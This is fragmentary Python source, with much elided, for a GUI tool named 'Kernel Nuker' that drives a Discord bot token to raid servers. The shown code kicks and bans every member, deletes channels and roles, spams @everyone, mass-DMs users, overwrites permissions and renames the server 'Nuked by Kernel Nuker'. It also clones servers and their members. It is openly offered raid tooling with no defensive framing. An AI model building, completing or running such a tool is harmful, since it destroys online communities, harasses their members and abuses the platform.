        ...
        for channel in source.channels:
            try:
                if isinstance(channel, discord.TextChannel):
                    parent = category_map.get(channel.category.id) if channel.category else None
...
async def raid_guild(guild_id, options, app):
    ...
    if options.get('create_channels', False):
        if not channel_prefix:
            ...
            return
        elif len(channel_prefix) > 80 or not re.match(r'^[\w-]+$', channel_prefix):
    ...
    if options.get('kick_members', False):
        ...
        for member in guild.members:
            if member != bot.user:
                try:
                    await member.kick(reason='Raid by Kernel Nuker')
                    members_kicked += 1
    ...
    if options.get('ban_members', False):
        ...
        for member in guild.members:
            if member != bot.user:
                try:
                    await member.ban(reason='Raid by Kernel Nuker')
                    members_banned += 1
    ...
    if options.get('spam_everyone', False):
        ...
        spam_message = options.get('spam_message', '@everyone Raid by Kernel Nuker!')
...
async def create_custom_channels(guild_id, channels, category_name, app):
    ...
    category = None
    if category_name:
        if not re.match(r'^[\w-]+$', category_name) or len(category_name) > 100:
...
async def advanced_features(guild_id, options, app):
    ...
    if options.get('server_nuke', False):
        ...
        try:
            ...
            try:
                await guild.edit(name='Nuked by Kernel Nuker')
...
class KernelNukerApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title('Kernel Nuker')
        ...
        self.label = ctk.CTkLabel(main_frame, text='Kernel Nuker', font=('Arial', 18, 'bold'), text_color='#FF5555')
        self.label.pack(pady=10)
        
        self.tabview = ctk.CTkTabview(main_frame, width=500, height=300, corner_radius=8, 
                                      fg_color='#2D3839', segmented_button_selected_color='#FF5555')
        ...
        self.source_entry = ctk.CTkEntry(self.clone_frame, placeholder_text='Source Guild ID', 
                                        width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.source_entry.grid(row=0, column=0, padx=5, pady=5, sticky='ew')
        
        self.dest_entry = ctk.CTkEntry(self.clone_frame, placeholder_text='Destination Guild ID', 
                                       width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        ...
        self.clone_roles_checkbox = ctk.CTkCheckBox(self.clone_frame, text='Clone Roles', 
                                                    variable=self.clone_roles_var, text_color='#FFFFFF',
                                                    checkbox_width=20, checkbox_height=20)
        self.clone_roles_checkbox.grid(row=1, column=0, padx=5, pady=3, sticky='w')
        
        self.clone_channels_checkbox = ctk.CTkCheckBox(self.clone_frame, text='Clone Channels', 
                                                       variable=self.clone_channels_var, text_color='#FFFFFF',
                                                       checkbox_width=20, checkbox_height=20)
        self.clone_channels_checkbox.grid(row=1, column=1, padx=5, pady=3, sticky='w')
        
        self.clone_members_checkbox = ctk.CTkCheckBox(self.clone_frame, text='Clone Members', 
                                                      variable=self.clone_members_var, text_color='#FFFFFF',
                                                      checkbox_width=20, checkbox_height=20)
        self.clone_members_checkbox.grid(row=2, column=0, padx=5, pady=3, sticky='w')
        
        self.assign_roles_checkbox = ctk.CTkCheckBox(self.clone_frame, text='Assign Roles', 
                                                     variable=self.assign_roles_var, text_color='#FFFFFF',
                                                     checkbox_width=20, checkbox_height=20)
        self.assign_roles_checkbox.grid(row=2, column=1, padx=5, pady=3, sticky='w')
        
        self.clone_button = ctk.CTkButton(self.clone_frame, text='Clone Server', command=self.clone_server, 
                                         fg_color='#FF5555', hover_color='#FF7777', width=150, height=35)
        ...
        self.raid_entry = ctk.CTkEntry(self.raid_frame, placeholder_text='Guild ID', 
                                      width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        ...
        self.delete_channels_checkbox = ctk.CTkCheckBox(self.raid_frame, text='Delete Channels', 
                                                        variable=self.delete_channels_var, text_color='#FFFFFF',
                                                        checkbox_width=20, checkbox_height=20)
        self.delete_channels_checkbox.grid(row=1, column=0, padx=5, pady=3, sticky='w')
        
        self.delete_roles_checkbox = ctk.CTkCheckBox(self.raid_frame, text='Delete Roles', 
                                                     variable=self.delete_roles_var, text_color='#FFFFFF',
                                                     checkbox_width=20, checkbox_height=20)
        self.delete_roles_checkbox.grid(row=1, column=1, padx=5, pady=3, sticky='w')
        
        self.kick_members_checkbox = ctk.CTkCheckBox(self.raid_frame, text='Kick Members', 
                                                     variable=self.kick_members_var, text_color='#FFFFFF',
                                                     checkbox_width=20, checkbox_height=20)
        self.kick_members_checkbox.grid(row=2, column=0, padx=5, pady=3, sticky='w')
        
        self.ban_members_checkbox = ctk.CTkCheckBox(self.raid_frame, text='Ban Members', 
                                                    variable=self.ban_members_var, text_color='#FFFFFF',
                                                    checkbox_width=20, checkbox_height=20)
        ...
        self.spam_everyone_checkbox = ctk.CTkCheckBox(self.spam_frame, text='Spam @everyone', 
                                                      variable=self.spam_everyone_var, text_color='#FFFFFF',
                                                      checkbox_width=20, checkbox_height=20)
        self.spam_everyone_checkbox.grid(row=0, column=0, padx=5, pady=3, sticky='w')
        
        self.spam_message_entry = ctk.CTkEntry(self.spam_frame, placeholder_text='Spam Message', 
                                              width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.spam_message_entry.grid(row=0, column=1, padx=5, pady=3, sticky='ew')
        
        self.create_channels_checkbox = ctk.CTkCheckBox(self.spam_frame, text='Create Channels', 
                                                        variable=self.create_channels_var, text_color='#FFFFFF',
                                                        checkbox_width=20, checkbox_height=20)
        self.create_channels_checkbox.grid(row=1, column=0, padx=5, pady=3, sticky='w')
        
        self.channel_message_entry = ctk.CTkEntry(self.spam_frame, placeholder_text='Channel Spam Message', 
                                                 width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.channel_message_entry.grid(row=1, column=1, padx=5, pady=3, sticky='ew')
        
        self.channel_prefix_entry = ctk.CTkEntry(self.spam_frame, placeholder_text='Channel Prefix (e.g., kernel)', 
                                                width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.channel_prefix_entry.grid(row=2, column=0, columnspan=2, padx=5, pady=3, sticky='ew')
        
        self.raid_button = ctk.CTkButton(self.raid_frame, text='Launch Raid', command=self.raid_server, 
                                        fg_color='#FF5555', hover_color='#FF7777', width=150, height=35)
        ...
        self.custom_guild_entry = ctk.CTkEntry(self.custom_frame, placeholder_text='Guild ID', 
                                              width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.custom_guild_entry.grid(row=0, column=0, padx=5, pady=5, sticky='ew')
        
        self.category_name_entry = ctk.CTkEntry(self.custom_frame, placeholder_text='Category Name (optional)', 
                                               width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.category_name_entry.grid(row=1, column=0, padx=5, pady=5, sticky='ew')
        
        self.channel_names_entry = ctk.CTkEntry(self.custom_frame, placeholder_text='Channel Names (comma-separated)', 
                                               width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.channel_names_entry.grid(row=2, column=0, padx=5, pady=5, sticky='ew')
        
        self.custom_button = ctk.CTkButton(self.custom_frame, text='Create Channels', command=self.create_custom_channels, 
                                          fg_color='#FF5555', hover_color='#FF7777', width=150, height=35)
        ...
        self.adv_guild_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='Guild ID', 
                                           width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        ...
        self.mass_dm_checkbox = ctk.CTkCheckBox(self.adv_frame, text='Mass DM', 
                                                variable=self.mass_dm_var, text_color='#FFFFFF',
                                                checkbox_width=20, checkbox_height=20)
        self.mass_dm_checkbox.grid(row=1, column=0, padx=5, pady=3, sticky='w')
        
        self.dm_message_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='DM Message', 
                                            width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.dm_message_entry.grid(row=1, column=1, padx=5, pady=3, sticky='ew')
        
        self.server_nuke_checkbox = ctk.CTkCheckBox(self.adv_frame, text='Server Nuke', 
                                                    variable=self.server_nuke_var, text_color='#FFFFFF',
                                                    checkbox_width=20, checkbox_height=20)
        self.server_nuke_checkbox.grid(row=2, column=0, padx=5, pady=3, sticky='w')
        
        self.perm_overwrite_checkbox = ctk.CTkCheckBox(self.adv_frame, text='Permission Overwrite', 
                                                       variable=self.perm_overwrite_var, text_color='#FFFFFF',
                                                       checkbox_width=20, checkbox_height=20)
        self.perm_overwrite_checkbox.grid(row=3, column=0, padx=5, pady=3, sticky='w')
        
        self.perm_role_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='Role Name (e.g., Admin)', 
                                           width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.perm_role_entry.grid(row=3, column=1, padx=5, pady=3, sticky='ew')
        
        self.schedule_message_checkbox = ctk.CTkCheckBox(self.adv_frame, text='Schedule Message', 
                                                         variable=self.schedule_message_var, text_color='#FFFFFF',
                                                         checkbox_width=20, checkbox_height=20)
        self.schedule_message_checkbox.grid(row=4, column=0, padx=5, pady=3, sticky='w')
        
        self.schedule_message_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='Scheduled Message', 
                                                  width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.schedule_message_entry.grid(row=4, column=1, padx=5, pady=3, sticky='ew')
        
        self.schedule_channel_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='Channel ID', 
                                                  width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.schedule_channel_entry.grid(row=5, column=0, padx=5, pady=3, sticky='ew')
        
        self.schedule_delay_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='Delay in Seconds', 
                                                width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.schedule_delay_entry.grid(row=5, column=1, padx=5, pady=3, sticky='ew')
        
        self.adv_button = ctk.CTkButton(self.adv_frame, text='Run Advanced', command=self.run_advanced, 
                                       fg_color='#FF5555', hover_color='#FF7777', width=150, height=35)
        ...
        self.token_entry = ctk.CTkEntry(self.token_frame, placeholder_text='Bot Token', 
                                       width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF', show='*')
        self.token_entry.pack(pady=5, padx=5)
        
        self.connect_button = ctk.CTkButton(self.token_frame, text='Connect', command=self.run_bot, 
                                           fg_color='#00AA00', hover_color='#00CC00', width=150, height=35)
        self.connect_button.pack(pady=5)
        
        self.log_textbox = ctk.CTkTextbox(main_frame, width=500, height=120, 
                                         fg_color='#3A4A4B', text_color='#FFFFFF')
    ...
    def clone_server(self):
        try:
            ...
            options = {
                ...
                'clone_channels': self.clone_channels_var.get(),
                'clone_members': self.clone_members_var.get(),
                'assign_roles': self.assign_roles_var.get()
            }
    ...
    def raid_server(self):
        try:
            ...
            options = {
                ...
                'spam_message': self.spam_message_entry.get(),
                'create_channels': self.create_channels_var.get(),
                'channel_message': self.channel_message_entry.get() or 'Raid in progress!',
                'channel_prefix': self.channel_prefix_entry.get() or 'kernel'
            }
    ...
    def run_advanced(self):
        try:
            ...
            options = {
                ...
                'perm_overwrite': self.perm_overwrite_var.get(),
                'perm_role': self.perm_role_entry.get(),
                'schedule_message': self.schedule_message_var.get(),
                'schedule_message_text': self.schedule_message_entry.get(),
                'schedule_channel_id': int(self.schedule_channel_entry.get()) if self.schedule_channel_entry.get() else None,
                'schedule_delay': int(self.schedule_delay_entry.get()) if self.schedule_delay_entry.get() else 60
            }
